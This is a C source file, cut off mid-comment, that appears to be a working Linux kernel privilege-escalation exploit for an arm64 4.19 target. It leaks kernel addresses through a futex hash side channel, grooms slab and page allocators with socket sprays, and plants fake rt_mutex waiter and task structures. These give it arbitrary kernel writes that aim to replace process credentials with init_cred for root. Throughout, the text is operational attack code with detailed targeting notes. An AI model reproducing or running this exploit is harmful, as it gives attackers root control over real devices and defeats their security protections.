#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include <pthread.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
#define MAX_GUARD_SOCKS 4096
static int guard_sv[MAX_GUARD_SOCKS][2];
static int guard_socks;
static int guard_page_count;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static long long ms_since(struct timespec *t0) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0->tv_sec) * 1000LL +
         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
}

/* f2fs rollback drops everything since the last checkpoint, so fsync at
 * stage boundaries or a panicking run loses its own lines */
void log_sync(void) {
  fflush(stdout);
  fsync(STDOUT_FILENO);
}

uintptr_t page_base;
uintptr_t last_mm_struct;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;

uint64_t g_kernel_slide;
uint64_t g_perf_anchor;
uint64_t g_ks_scan_start;
uint64_t g_ks_scan_end;

int pselect_custom_write;
uintptr_t pselect_custom_target;
int pselect_child_node;  /* Preserve initialized bytes when set. */

void set_pselect_write_mode(uintptr_t target, int mode) {
  pselect_custom_target = target;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
}

int tcp_route_selected(void) {
  /* The ruby 4.19 target always uses the sigreturn plant, never the 6.x TCP
   * zerocopy route. */
  return 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  struct timespec boot;
  clock_gettime(CLOCK_BOOTTIME, &boot);
  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
  /* same clock as printk's [timestamp], so a native log line maps onto dmesg */
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u boot_ms=%.0f "
             "attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms, attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

/* Bootloader-selected physical load address. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;

uint64_t g_direct_map_end = DIRECT_MAP_END;

/* Selected entry's init_cred image address. */
uintptr_t g_init_cred_image;

void init_p0_profile(void) {
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t data_addr(uintptr_t image_addr) {
#ifdef GHOSTLOCK_TARGET_4_19
  /* On this kernel the virtual KASLR slide is independent of the randomized
   * linear-map base.  Use the leaked image slide and address .data through
   * the image mapping; no memstart_addr assumption is needed. */
  return image_addr + (uintptr_t)g_kernel_slide;
#else
  return p0_data_alias(image_addr);
#endif
}

#ifdef GHOSTLOCK_TARGET_4_19
/* The perf sample at el0_svc_common+0x44 is the most frequent one while
 * hammering getpid.  Its link address is stable for this boot image:
 *   el0_svc_common = 0xffffff8008224884, +0x44 = 0xffffff80082248c8.
 * The KASLR slide is 2 MiB aligned and lives in the arm64 range
 * [BIT(VA_BITS-3), BIT(VA_BITS-2)].  A direct-map register sample gives a
 * pointer into the randomized linear map; scanning +/-8 GiB around it covers
 * every possible mm_struct regardless of memstart_addr. */
#define KSLIDE_SAMPLE_LINK 0xffffff80082248c8ULL
#define KSLIDE_2M_MASK 0x1fffffULL
#define KSLIDE_MIN 0x1000000000ULL
#define KSLIDE_MAX 0x3000000000ULL
#define KS419_PAGE_OFFSET 0xffffffc000000000ULL
/* The spray/slab pages observed on this target live above the 4 GiB physical
 * mark (direct-map VA >= PAGE_OFFSET + 4 GiB).  The low half is full of
 * unrelated kernel allocations; scanning it yields tag collisions that pass
 * the window check but use a random fake lock, which has caused both the
 * +0x650 tree BUG and a hard reset during the W2 route. */
#define KS419_SPRAY_FLOOR (KS419_PAGE_OFFSET + (4ULL << 30))

void configure_ks_window(void) {
  uint64_t start, end;
  /* Once a page has been leaked, the process mm is known: keep later
   * windows centred on it.  A fresh perf anchor can sit far enough away
   * that the window misses the real mm and matches a hash collision in an
   * unrelated part of the range (the W2 page then faults on the fake lock). */
  uint64_t anchor = g_perf_anchor;
  if (last_mm_struct && last_mm_struct != (uintptr_t)-1)
    anchor = (uint64_t)last_mm_struct;
  uint64_t win = 8ULL << 30;
  if (anchor >= KS419_PAGE_OFFSET) {
    start = (anchor > win) ? anchor - win : KS419_PAGE_OFFSET;
    end = anchor + win;
  } else {
    /* Fallback: scan the whole randomized linear map. */
    start = KS419_PAGE_OFFSET;
    end = ~0ULL;
  }
  if (start < KS419_SPRAY_FLOOR) start = KS419_SPRAY_FLOOR;
  start &= ~(COARSE_SZ - 1);
  if (end >= start) {
    /* Do not let the align-up wrap past the top of the address space when the
     * perf anchor is within one bucket of ~0 (seen on some KASLR slides). */
    if (end > ~0ULL - (COARSE_SZ - 1))
      end = ~0ULL;
    else
      end = (end + COARSE_SZ - 1) & ~(COARSE_SZ - 1);
  } else {
    end = ~0ULL;
  }
  if (end > ~0ULL - COARSE_SZ) end = ~0ULL - COARSE_SZ;
  g_ks_scan_start = start;
  g_ks_scan_end = end;
  g_direct_map_end = end;
  pr_info("ks window anchor=%016llx start=%016llx end=%016llx\n",
          (unsigned long long)anchor,
          (unsigned long long)g_ks_scan_start,
          (unsigned long long)g_ks_scan_end);
}
#else
void configure_ks_window(void) {}
#endif

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

/* Allocate order-3 data pages and keep them queued on AF_UNIX sockets.
 *
 * The leak slab is one half of an order-4 buddy pair on this target.  If the
 * other half is free when close(memfd_leak) discards the slab, the two merge
 * into an order-4 block and the order-3 reclaim send never sees the leak page.
 * The pre/post guard slabs only cover that buddy if SLUB happened to place
 * them next to the leak; that is not reliable.  Sending 32 KiB on a stream
 * socket allocates exactly one order-3 page (unix_stream_sendmsg turns the
 * payload into one paged frag).  Draining the DMA32 order-3/4 free lists with
 * these guard skbs pins the leak's buddy before the leak is freed, so the
 * freed leak page stays a standalone order-3 block at the head of the free
 * list. */
static int guard_spray_order3(int pages) {
  const int per_sock = 6;
  struct iovec iov;
  struct msghdr msg;
  memset(&iov, 0, sizeof(iov));
  memset(&msg, 0, sizeof(msg));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  int done = 0;
  while (done < pages && guard_socks < MAX_GUARD_SOCKS) {
    int *sv = guard_sv[guard_socks];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) break;
    int sndbuf = 4 << 20;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
    int flags = fcntl(sv[0], F_GETFL, 0);
    if (flags >= 0) fcntl(sv[0], F_SETFL, flags | O_NONBLOCK);
    guard_socks++;
    int sent_this = 0;
    for (int i = 0; i < per_sock && done < pages; i++) {
      errno = 0;
      ssize_t sent = sendmsg(sv[0], &msg, MSG_DONTWAIT);
      if (sent <= 0) break;
      done++;
      sent_this++;
    }
    if (sent_this == 0) {
      /* The send buffer was already exhausted; do not keep an empty socket. */
      close(sv[0]);
      close(sv[1]);
      sv[0] = sv[1] = -1;
      guard_socks--;
      break;
    }
  }
  guard_page_count = done;
  pr_info("[spray] guard order3 pages=%d sockets=%d\n", done, guard_socks);
  return done;
}

static void guard_release(void) {
  for (int i = 0; i < guard_socks; i++) {
    if (guard_sv[i][0] >= 0) close(guard_sv[i][0]);
    if (guard_sv[i][1] >= 0) close(guard_sv[i][1]);
    guard_sv[i][0] = guard_sv[i][1] = -1;
  }
  guard_socks = 0;
  guard_page_count = 0;
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

#ifdef GHOSTLOCK_TARGET_4_19
  /* A full pre slab guarantees the leak is allocated in the next slab (or
   * after the tail of a partially used slab), never in the middle of the
   * pre slab.  That makes pre[0] a reliable guard for the slab before the
   * leak and lets the post objects fill the leak slab. */
  pre_ctx.mm_cnt = mm_objs_per_slab;
#else
  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
#endif
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

static void rcu_force_grace(void) {
  /* mm_free_rcu() uses call_rcu() on this tree.  MEMBARRIER_CMD_GLOBAL is
   * synchronize_sched() and does not wait for plain RCU callbacks, so the
   * leak slab often stayed allocated until after the reclaim send.  GLOBAL_
   * EXPEDITED is synchronize_rcu(); issue it twice so the callbacks queued
   * before the first grace period have been invoked by the end of the second
   * one. */
#ifdef SYS_membarrier
  syscall(SYS_membarrier, 2 /* MEMBARRIER_CMD_GLOBAL_EXPEDITED */, 0);
  syscall(SYS_membarrier, 2 /* MEMBARRIER_CMD_GLOBAL_EXPEDITED */, 0);
  syscall(SYS_membarrier, 2 /* MEMBARRIER_CMD_GLOBAL_EXPEDITED */, 0);
  /* The callbacks are invoked from the RCU softirq after the grace period;
   * give the CPU a moment to run it.  The guard pages already pin the leak
   * page's order-3 buddy, so this short sleep does not change its zone. */
  usleep(1000);
#endif
}

int prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  /* 4.19 sigreturn payload: the leaked order-3 page is the payload base. */
  long long payload_delta = 0;
  size_t chunk_bias = 0;
  size_t fake_task_off = (size_t)FAKE_TASK_OFF;

  uintptr_t payload_base = base + payload_delta;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + fake_task_off;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (pselect_custom_write) {
    if (pselect_child_node) {
      if (pselect_custom_write == 2) {
        /* W2 uses init_cred; resolve it from the selected device entry. */
        fake_right = data_addr(g_init_cred_image);
      } else {
        /* W1 targets the initialized page at base+0x100. */
        fake_right = base + 0x100;
      }
    } else {
      fake_right = 0;  /* leaf: write 0 */
    }
    fake_left = 0;
    if (pselect_custom_write == 2) {
      fake_fops = payload_base + CRED_COPY_OFF;
    }
    fake_parent = pselect_custom_target - 8;
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
   * the same way for the on-stack waiter. */
  uint64_t waiter_task = SLIDE_INIT_TASK;
  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
  uint64_t pi_top_task = SLIDE_INIT_TASK;

#ifdef LEGACY_RT_MUTEX_WAITER
  /* 4.19 rt_mutex_waiter: tree_entry, pi_tree_entry, task, lock, prio,
   * deadline.  It shares the compact branch's pi_tree relink layout. */
  int compact = 1;
#else
  int compact = COMPACT_RT_MUTEX_WAITER;
#endif

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + chunk_bias;

    put32(p, LOCK_OFF + 0x00, 0u);
    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    put64(p, LOCK_OFF + 0x18, fake_task | 1);

    if (compact) {
      /* Words ride the erase relink: pc = value, rb_left = dest,
       * rb_right = 0 or the one-child arm also clobbers *(value) with
       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
       * would leave the node parentless for enqueue_pi to trash
       * fake_task. prio > 120 gates this erase. The relink's second
       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
      if (write_right) {
        put64(p, W0_OFF + 0x18, write_right);
        put64(p, W0_OFF + 0x20, 0);
        put64(p, W0_OFF + 0x28, pselect_custom_target);
      } else {
        put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
        put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
        put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
      }
      put64(p, W0_OFF + 0x30, waiter_task); /* task */
      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
#ifdef LEGACY_RT_MUTEX_WAITER
      put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO); /* prio */
      put32(p, W0_OFF + 0x44, 0);                 /* padding */
      put64(p, W0_OFF + 0x48, 0);           /* deadline */
#else
      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
      put64(p, W0_OFF + 0x48, 0);           /* deadline */
      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
#endif
    }
    {
      uint64_t dbg_w0lock = 0, dbg_w0task = 0;
      memcpy(&dbg_w0lock, p + W0_OFF + 0x38, sizeof(dbg_w0lock));
      memcpy(&dbg_w0task, p + W0_OFF + 0x30, sizeof(dbg_w0task));
      pr_info("DBG payload chunk=%zx compact=%d base=%llx pbase=%llx fake_lock=%llx fake_w0=%llx w0task=%llx w0lock=%llx\n",
              chunk, compact, (unsigned long long)base,
              (unsigned long long)payload_base,
              (unsigned long long)fake_lock, (unsigned long long)fake_w0,
              (unsigned long long)dbg_w0task, (unsigned long long)dbg_w0lock);
    }

    uint32_t ft_prio_off       = FAKE_TASK_PRIO_OFF;
    uint32_t ft_nprio_off      = FAKE_TASK_NORMAL_PRIO_OFF;
    uint32_t ft_tg_off         = FAKE_TASK_TASK_GROUP_OFF;
    uint32_t ft_pi_lock_off    = FAKE_TASK_PI_LOCK_OFF;
    uint32_t ft_pi_wait_off    = FAKE_TASK_PI_WAITERS_OFF;
    uint32_t ft_pi_top_off     = FAKE_TASK_PI_TOP_TASK_OFF;
    uint32_t ft_pi_blocked_off = FAKE_TASK_PI_BLOCKED_ON_OFF;

    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_pi_lock_off, 0);
    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
    put64(p, fake_task_off + ft_pi_wait_off, 0);
    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
    put64(p, fake_task_off + ft_tg_off, task_group);
    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
    put64(p, fake_task_off + ft_pi_blocked_off, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (pselect_custom_write >= 2) {
      fill_init_cred_copy(p, CRED_COPY_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(void) {
  struct timespec t_spray;
  clock_gettime(CLOCK_MONOTONIC, &t_spray);
  configure_ks_window();
  /* Keep every mm_struct clone/allocation on the same CPU.  Otherwise the
   * post children can fill slabs on other CPUs, the leak slab stays mostly
   * free, and freeing the leaked object leaves an empty active slab cached in
   * the CPU partial list instead of returning the order-3 page to the buddy
   * allocator. */
  pin_to_core(CORE);
  close_reclaim_sockets();
  guard_release();
#ifdef GHOSTLOCK_TARGET_4_19
  /* /sys/kernel/slab/mm_struct: object_size=912, slab_size=0x3c0,
   * objs_per_slab=34, order=3.  Using sizeof(mm_struct) (0x390) yields 35
   * and every free stride crosses a slab, so no slab is ever emptied and
   * the leaked page cannot return to the buddy allocator. */
  mm_objs_per_slab = ORDER3_SIZE / 0x3c0;
#else
  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
#endif
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(&t_spray));

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("[spray] finding futex collisions... +%lldms\n",
          ms_since(&t_spray));
  {
    struct timespec t_wait;
    clock_gettime(CLOCK_MONOTONIC, &t_wait);
    int leak_status = 0;
    pid_t wp = 0;
    long long last_beat = 0;
    for (;;) {
      wp = waitpid(child_leak, &leak_status, WNOHANG);
      if (wp == child_leak) {
        break;
      }
      if (wp < 0) {
        pr_warning("waitpid leak child: %m\n");
        break;
      }
      long long waited = ms_since(&t_wait);
      if (waited >= 60000) {
        pr_warning("leak child stuck >60s, killing it\n");
        kill(child_leak, SIGKILL);
        waitpid(child_leak, NULL, 0);
        break;
      }
      if (waited - last_beat >= 2000) {
        size_t scan_done = ks->scan_done;
        size_t scan_total = ks->total_futexes;
        if (scan_done > scan_total) scan_done = scan_total;
        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
        pr_info("[spray]   still finding collisions (%llds) %zu%% "
                "(futex 0x%zx/0x%zx)...\n",
                waited / 1000,
                scan_total ? scan_done * 100 / scan_total : 0,
                scan_id, (size_t)FUTEX_SZ);
        last_beat = waited;
      }
      usleep(50000);
    }
    if (wp == child_leak &&
        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
      pr_warning("leak child exit status=%d\n", leak_status);
    }
  }
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("[spray] futex collisions not found\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  pr_info("[spray] futex collisions found +%lldms\n",
          ms_since(&t_spray));
  kernelsnitch_bruteforce(ks);
  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
          (size_t)ks->mm_struct, ms_since(&t_spray));
  uintptr_t raw_leak = ks->mm_struct;
  uintptr_t leaked = raw_leak | (uintptr_t)0xf << 56;
  /* mm_structs live in the randomized direct map; for 4.19 the scan window
   * comes from the perf anchor, otherwise use the built-in geometry. */
  uintptr_t scan_start = KERNELSNITCH_IDENTITY_START;
  uintptr_t scan_end = g_direct_map_end;
#ifdef GHOSTLOCK_TARGET_4_19
  scan_start = g_ks_scan_start;
  scan_end = g_ks_scan_end;
#endif
  /* The canonical kernel pointer has top byte 0xff.  A leak from the tag
   * sweep (top byte 0xfn, n != f) is a hash collision in an unrelated page:
   * it passes the window test, then the route uses a random fake lock and
   * has reset the device.  Only the canonical-tag pass is trustworthy here. */
  if (raw_leak == (uintptr_t)-1 ||
      (raw_leak >> 56) != 0xff ||
      leaked < scan_start ||
      leaked >= scan_end) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /* only remember a leak that passed the window check */
  last_mm_struct = leaked;
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 4 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  setsockopt(reclaim_sv[1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
#ifdef GHOSTLOCK_TARGET_4_19
  /* The post-leak freeze spray is mandatory on 4.19.  close(memfd_leak)
   * frees the leak object into a slab that was frozen on the CPU-partial list
   * by the pre/post frees, so the empty slab is not returned to the buddy
   * allocator.  The spray below supplies the first frees that force
